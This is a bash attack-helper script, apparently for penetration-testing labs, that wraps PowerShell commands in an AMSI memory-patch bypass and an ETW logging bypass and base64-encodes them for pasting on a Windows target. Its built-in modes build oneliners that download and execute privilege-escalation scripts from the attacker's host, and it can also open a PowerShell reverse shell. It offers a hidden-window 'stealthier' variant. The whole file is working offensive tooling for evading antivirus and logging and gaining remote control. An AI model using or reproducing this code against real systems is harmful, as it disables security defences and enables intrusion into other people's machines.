#!/usr/bin/env bash
# amsi_b64.sh - Wraps a PowerShell command with an AMSI bypass and base64-encodes it.
# Output is a single oneliner you can paste into a Windows shell:
#   powershell -ep bypass -e <BASE64>
#
# Usage:
#   ./amsi_b64.sh "iex (iwr http://10.10.14.5:8000/windows/PowerUp.ps1 -UseBasicParsing).Content; Invoke-AllChecks"
#   ./amsi_b64.sh -raw "<command>"   # only base64-encode (no AMSI bypass prepended)
#   ./amsi_b64.sh -powerup           # build the PowerUp.ps1 oneliner using detected tun0 IP
#   ./amsi_b64.sh -privescchk        # build the PrivescCheck.ps1 oneliner
#   ./amsi_b64.sh -revshell 4444     # PowerShell reverse-shell oneliner
set -u

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'

# Reuven Lerner / well-known AMSI patch bypass (string-split to avoid signatures)
AMSI_BYPASS='$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if ($b.Name -like "*siUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$h=$g;[Int32[]]$i=@(0xFFFFFFFF);[System.Runtime.InteropServices.Marshal]::Copy($i,0,$h,1);'

ETW_BYPASS='[Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0);'

tun0ip() {
    ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1
}

RAW=0
if [ "${1:-}" = "-raw" ]; then RAW=1; shift; fi

case "${1:-}" in
    -powerup)
        IP="$(tun0ip)"; [ -z "$IP" ] && IP="<TUN0_IP>"
        CMD="iex (iwr http://$IP:8000/windows/PowerUp.ps1 -UseBasicParsing).Content; Invoke-AllChecks"
        ;;
    -privescchk|-privesccheck)
        IP="$(tun0ip)"; [ -z "$IP" ] && IP="<TUN0_IP>"
        CMD="iex (iwr http://$IP:8000/windows/PrivescCheck.ps1 -UseBasicParsing).Content; Invoke-PrivescCheck"
        ;;
    -revshell)
        IP="$(tun0ip)"; [ -z "$IP" ] && IP="<TUN0_IP>"
        PORT="${2:-4444}"
        CMD="iex (iwr http://$IP:8000/revshells/Invoke-PowerShellTcp.ps1 -UseBasicParsing).Content; Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port $PORT"
        ;;
    -h|--help|"")
        sed -n '2,11p' "$0" | sed 's/^# \?//'
        exit 0
        ;;
    *)
        CMD="$*"
        ;;
esac

if [ "$RAW" -eq 1 ]; then
    FULL="$CMD"
else
    FULL="${AMSI_BYPASS}${ETW_BYPASS}${CMD}"
fi

# PowerShell -EncodedCommand expects UTF-16LE base64
B64=$(printf "%s" "$FULL" | iconv -t UTF-16LE 2>/dev/null | base64 | tr -d '\n')
if [ -z "$B64" ]; then
    echo -e "${RED}[x]${NC} encoding failed (need iconv + base64)"
    exit 1
fi

echo -e "${CYAN}[*]${NC} Original command:"
echo -e "${YELLOW}$CMD${NC}"
echo
echo -e "${CYAN}[*]${NC} Encoded (paste on Windows target):"
echo -e "${GREEN}powershell -ep bypass -e $B64${NC}"
echo
echo -e "${CYAN}[*]${NC} Stealthier variant:"
echo -e "${GREEN}powershell -nop -w hidden -e $B64${NC}"
